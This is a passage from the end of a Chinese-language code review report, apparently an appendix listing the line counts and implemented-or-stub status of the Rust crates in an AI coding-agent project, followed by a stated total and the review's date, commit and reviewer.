| config | src/lib.rs | 280 | 实现 |
| llm | src/lib.rs | 124 | 实现 |
| llm | src/anthropic.rs | 498 | 实现 |
| llm | src/sse.rs | 308 | 实现 |
| tools | src/lib.rs | 116 | 实现 |
| tools | src/fs_tools.rs | 765 | 实现 |
| tools | src/path_guard.rs | 189 | 实现 |
| tools | src/shell_tool.rs | 350 | 实现 |
| core | src/lib.rs | 18 | 实现(re-export) |
| core | src/session.rs | 1387 | 实现 |
| app-server | src/lib.rs | 580 | 实现 |
| cli | src/main.rs | 271 | 实现 |
| cli | src/bootstrap.rs | 184 | 实现 |
| cli | src/markdown.rs | 749 | 实现 |
| cli | src/render.rs | 699 | 实现 |
| cli | src/wave.rs | 100 | 实现 |
| auth | src/lib.rs | 5 | stub |
| context | src/lib.rs | 5 | stub |
| hooks | src/lib.rs | 7 | stub |
| mcp | src/lib.rs | 6 | stub |
| memory | src/lib.rs | 6 | stub |
| sandbox | src/lib.rs | 7 | stub |
| skills | src/lib.rs | 7 | stub |
| tui | src/lib.rs | 5 | stub |

**总计**:**6,899 行 Rust 代码**,7 个实现 crate + 8 个 stub crate。

> **行数说明**:报告正文引用行号时基于内容定位(包含注释与代码物理行号),附录 B 为 `wc -l` 输出(不计文件末换行)。两者差 1 行/文件的系统差属于 `wc -l` 与行号系统的常规偏差。

---

*报告生成日期:2026-08-04*
*审查对象 commit:d11e685(界面增强 T7:SPEC 渲染契约对账 + 真实 API 冒烟通过)*
*审查者:ZCode*